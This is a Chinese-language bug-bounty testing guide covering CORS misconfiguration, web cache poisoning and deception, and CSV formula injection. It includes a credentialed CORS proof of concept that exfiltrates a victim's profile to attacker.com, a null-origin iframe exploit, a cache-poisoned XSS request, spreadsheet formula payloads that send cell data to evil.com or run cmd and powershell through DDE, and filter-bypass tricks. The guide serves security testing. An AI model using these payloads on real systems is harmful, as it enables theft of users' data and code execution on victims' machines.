---
name: cors-cache
description: 三个常被忽视但回报稳定的漏洞类型,合并在一个文件处理。
category: vuln
tags: [client]
---

# CORS / 缓存投毒 / CSV 公式注入

> 三个常被忽视但回报稳定的漏洞类型,合并在一个文件处理。

---

## 一、CORS 跨域配置错误

**CWE**: CWE-693 | **OWASP**: WSTG-CLNT-07 / A05:2021

### 1.1 快速识别

发送带 Origin 的请求, 看响应头:

```http
# 请求
GET /api/user/profile HTTP/1.1
Origin: https://evil.com

# 高危响应 (任何一种)
Access-Control-Allow-Origin: https://evil.com              ← 反射 Origin
Access-Control-Allow-Origin: null                          ← null origin 接受
Access-Control-Allow-Origin: *                             ← 通配, 但若有 credentials 则更严重
Access-Control-Allow-Credentials: true                     ← 和上面组合即可窃取用户数据
```

### 1.2 六种常见 CORS 错配

| 类型 | 后端代码特征 | 漏洞 |
|------|-------------|------|
| **反射 Origin** | `ACAO = request.headers.origin` | 任意 Origin 可读 |
| **宽松正则** | `Origin.endsWith("target.com")` | `evil-target.com` 绕过 |
| **前缀匹配** | `Origin.startsWith("https://target")` | `https://target.evil.com` 绕过 |
| **通配子域** | 白名单 `*.target.com` 但 `sub.target.com` 可接管 | 子域接管 → CORS 滥用 |
| **null origin** | 允许 `null` | `data:`/`sandbox iframe` 产生 null |
| **HTTP-HTTPS 混用** | `http://target.com` 也在白名单 | 中间人可注入 |

### 1.3 三种值得尝试的 Origin

```http
Origin: https://evil.com
Origin: null
Origin: https://target.com.evil.com
Origin: https://evil.target.com        (若子域可注册)
Origin: https://target-com.evil.com     (unicode/正则漏洞)
Origin: http://target.com               (协议降级)
```

### 1.4 利用 PoC(跨域读敏感数据)

```html
<!DOCTYPE html>
<html><body>
<script>
fetch('https://target.com/api/user/profile', {
    credentials: 'include'
})
.then(r => r.text())
.then(t => {
    // 发送到攻击者服务器
    fetch('https://attacker.com/steal?data=' + btoa(t));
    document.body.innerText = t;
});
</script>
</body></html>
```

### 1.5 null Origin 利用

```html
<iframe sandbox="allow-scripts" srcdoc='
<script>
fetch("https://target.com/api/user", {credentials: "include"})
  .then(r=>r.text()).then(t=>top.postMessage(t,"*"));
</script>
'></iframe>
```

iframe 的 `sandbox` 会让其 Origin 为 `null`。

### 1.6 Testing Checklist

- [ ] 发 `Origin: https://evil.com` 看反射
- [ ] 发 `Origin: null`
- [ ] 发 `Origin: https://target.com.evil.com` 测 endsWith/正则
- [ ] 发 `Origin: https://evil-target.com` 测 startsWith
- [ ] 检查 `Access-Control-Allow-Credentials: true` 的接口
- [ ] 检查响应是否包含 Cookie/Token/敏感数据
- [ ] 若 ACAO 为 `*` 则无 Credentials(但仍可能泄露无鉴权接口)
- [ ] 组合子域名接管 → 白名单子域被接管

### 1.7 False Positive

| 陷阱 | 真相 |
|------|------|
| `ACAO: *` 但返回数据是公开的 | 不是漏洞 |
| 反射 Origin 但响应无 `Access-Control-Allow-Credentials: true` | 降级为中危 |
| 接口需要 header `Authorization` 而非 Cookie | 浏览器不自动带, 利用受限 |

---

## 二、Web 缓存投毒 (Web Cache Poisoning)

**CWE**: CWE-444 / CWE-525 | **OWASP**: A05:2021

### 2.1 原理

HTTP 响应被 CDN/反向代理/缓存层缓存, 攻击者通过 unkeyed input (不影响缓存键但影响响应) 注入恶意内容 → 后续受害用户请求同 URL 时收到攻击者控制的响应。

### 2.2 检测流程

```
Step 1: 找缓存层(CloudFront / Varnish / Cloudflare / Nginx cache)
Step 2: 识别 cache key (通常是 URL + Host, 有时含 Accept-Encoding)
Step 3: 找 unkeyed 输入 (通常是某些 Header: X-Forwarded-Host / X-Forwarded-Scheme / X-Host)
Step 4: 注入 payload 让响应被污染
Step 5: 等缓存命中, 用普通请求复现 payload
```

### 2.3 检测工具

```bash
# Param Miner (Burp 插件, PortSwigger)
# 自动发现 unkeyed headers

# nuclei
nuclei -t cache/ -l target.txt
```

### 2.4 常见 unkeyed Header

```
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Port: 1
X-Forwarded-For: evil
X-Original-URL: /admin
X-Host: evil.com
X-Real-IP: evil
X-Rewrite-URL: /admin
Host: evil.com          (如果应用用 Host 但缓存不用)
Referer: ...            (某些场景)
User-Agent: ...         (某些场景)
```

### 2.5 经典利用

#### A. X-Forwarded-Host 引发 Cache-Poisoned XSS

```http
GET /home HTTP/1.1
Host: target.com
X-Forwarded-Host: target.com/"><script>alert(1)</script>

# 响应(被缓存)
<link rel="canonical" href="https://target.com/\"><script>alert(1)</script>/home">

# 后续用户访问 /home 直接看到 XSS
```

#### B. Cache Key Injection

某些缓存把 `?` 之前作为 key, 但应用处理 `?`:
```http
GET /home?utm_source=evil HTTP/1.1
Host: target.com
# 缓存: /home → 响应可能被利用
```

#### C. Cache Deception (路径混淆)

```
GET /api/user/profile/nonexistent.css
```

- 缓存层看到 `.css` 认为是静态文件, 缓存它
- 应用服务器: `nonexistent.css` 被忽略, 返回 `/api/user/profile` 的数据
- 攻击者访问 `/api/user/profile/nonexistent.css` 拿到受害者的数据

### 2.6 Cache Deception PoC 步骤

```
1. 诱使受害者访问 https://target.com/api/user/profile/anything.css
2. 缓存层缓存这个 URL 对应受害者的数据
3. 攻击者访问同一 URL 获取数据
```

### 2.7 Testing Checklist

- [ ] 用 Param Miner 扫 unkeyed headers
- [ ] 观察 `X-Cache` / `Age` / `Via` 等响应头判断缓存
- [ ] 尝试 `X-Forwarded-Host` / `Host` 注入
- [ ] 测试 `/static.css` / `/anything.png` 路径混淆
- [ ] 试 `?cb=random` 绕过缓存隔离私人请求
- [ ] 利用 `Vary` 头不当 -> 不同 User-Agent 共享缓存
- [ ] 组合 XSS: unkeyed header 反射到 HTML 并缓存

### 2.8 False Positive

| 陷阱 | 真相 |
|------|------|
| `X-Cache: MISS` | 还未命中缓存, 不等于无法投毒; 多发几次 |
| 响应不同 | 可能是 cookie 个性化, 未必是缓存问题 |
| `Cache-Control: no-store` | 端点不缓存, 无漏洞 |
| 缓存过期快 | 仍可利用, 只是持续时间短 |

---

## 三、CSV 公式注入 (Formula Injection)

**CWE**: CWE-1236 | **OWASP**: A03:2021

### 3.1 原理

Excel / Google Sheets / LibreOffice 打开 CSV 文件时, 以 `=` `+` `-` `@` `\t` `\r` 开头的单元格会被解析为公式。攻击者注入带这些字符的内容, 受害者下载 CSV 并打开 → 执行公式。

### 3.2 攻击 payload

```
=HYPERLINK("https://evil.com/?data="&A1,"点击查看")
=cmd|'/c calc.exe'!A1                              # Excel DDE (Windows)
=IMPORTXML("https://evil.com/steal?d="&CONCATENATE(A1:D100), "//a")  # Google Sheets 外带
=IMPORTDATA("https://evil.com/steal?d="&A1)        # Google Sheets
=WEBSERVICE("https://evil.com/steal?d="&A1)        # Excel
@SUM(1+9)*cmd|'/c calc'!A0                         # @ 开头也触发
+1+cmd|'/c calc'!A0                                # + 开头
-2+3+cmd|'/c calc'!A0                              # - 开头
=rundll32|URL.dll,OpenURL "http://evil.com"!A1     # 老 Excel
```

### 3.3 典型场景

**用户资料字段 → 后台导出 CSV**:
- 用户昵称: `=HYPERLINK("https://evil.com/steal","点我")`
- 管理员导出用户列表 → 打开 Excel → 看到 "点我" 链接 → 点击触发

**评论/反馈 → 客服导出**:
- 反馈内容: `=cmd|'/c powershell -e <base64 payload>'!A1`
- 客服导出 Excel → 打开 → RCE

**表单提交 → 自动发邮件 CSV 附件**:
- 自动化邮件发给财务 / HR → 危害扩大

### 3.4 绕过防御

| 防御 | 绕过 |
|------|------|
| 过滤 `=` | 用 `+` / `-` / `@` 开头 |
| 过滤所有公式字符 | 用 `\t=` / `\r=` / `\x0A=` (前缀空白) |
| 加引号包裹 | 若只在首位 `="..."` 仍触发 |
| 单元格前加 `'` | 标准防御, 难绕过 |
| Unicode | `＝` (全角)在某些 Excel 版本仍解析 |

### 3.5 Testing Checklist

- [ ] 在所有会被导出 CSV 的字段(用户名/昵称/地址/备注/反馈)注入 `=HYPERLINK(...)`
- [ ] 尝试 `+` `-` `@` 四种 trigger 字符
- [ ] 尝试前缀 Tab/CR/LF 绕过过滤
- [ ] 触发导出 → 下载 CSV → Excel 打开验证
- [ ] Google Sheets 导入: `=IMPORTXML` 最易外带数据
- [ ] 组合社工: 让管理员/客服/财务打开

### 3.6 False Positive

| 陷阱 | 真相 |
|------|------|
| 打开 CSV 不触发 | 现代 Excel 会提示 "启用外部链接", 用户可拒绝 |
| Google Sheets 不支持 DDE | 但 IMPORTXML / IMPORTDATA 可用 |
| 字段长度限制 | 短 payload 仍有效, 如 `=A1+A2` |
| 单元格前面有前置字符 | 不触发, 必须以公式字符为首位 |

### 3.7 影响证明

**低**: CSV 中反射出 `=HYPERLINK` 字符串。

**高**(冲赏金):
1. 管理员点击恶意 HYPERLINK → IP 泄露
2. 自动触发 IMPORTXML → 表格数据被外带到攻击者服务器
3. DDE RCE → 受害者机器执行任意命令(需特定 Excel 版本)

---

## 四、Testing Checklist(合并)

### CORS
- [ ] Origin 反射 / null / 前缀 / 后缀匹配
- [ ] 配合 Credentials 窃取数据
- [ ] 子域接管 → CORS 白名单滥用

### Cache 投毒
- [ ] Param Miner 扫 unkeyed header
- [ ] X-Forwarded-Host / X-Original-URL
- [ ] 路径混淆(Cache Deception)

### CSV
- [ ] 所有可导出字段注入公式字符
- [ ] `=` / `+` / `-` / `@` 四种
- [ ] 下载验证

---

## 五、相关参考

| 内容 | 文件 |
|------|------|
| XSS(缓存投毒常导出 XSS) | [xss.md](xss.md) |
| CSRF(组合攻击) | [csrf-clickjacking.md](csrf-clickjacking.md) |
| 子域名接管(CORS 白名单) | [subdomain-takeover.md](subdomain-takeover.md) |
| HTTP 走私(也会造成缓存投毒) | [request-smuggling.md](request-smuggling.md) |

---

**CVSS 典型**: CORS 6.5-8.6 / Cache 7.5 / CSV 5.3 (但组合高)
